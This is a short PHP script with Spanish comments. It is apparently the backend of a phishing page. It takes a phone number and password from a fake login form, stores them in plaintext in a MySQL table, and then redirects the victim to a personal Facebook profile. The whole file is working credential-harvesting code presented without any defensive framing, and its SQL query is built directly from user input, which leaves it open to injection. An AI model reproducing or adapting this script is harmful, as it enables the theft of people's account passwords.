<?php
// Conexión a la base de datos (reemplaza los valores con los tuyos)
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "registro";

// Obtener los datos del formulario
$numero_celular = $_POST['numero_celular'];
$contrasena = $_POST['contrasena'];

// Crear la conexión a la base de datos
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar si hay errores en la conexión
if ($conn->connect_error) {
    die("Error en la conexión a la base de datos: " . $conn->connect_error);
}

// Insertar los datos en la base de datos
$sql = "INSERT INTO usuarios (numero_celular, contrasena) VALUES ('$numero_celular', '$contrasena')";

if ($conn->query($sql) === TRUE) {
    // Redirigir al usuario al aplicativo de Facebook
    header("Location: https://web.facebook.com/maylove.alveslaveriano");
    exit();
} else {
    echo "Error en el inicio de sesión: " . $conn->error;
}

// Cerrar la conexión a la base de datos
$conn->close();
?>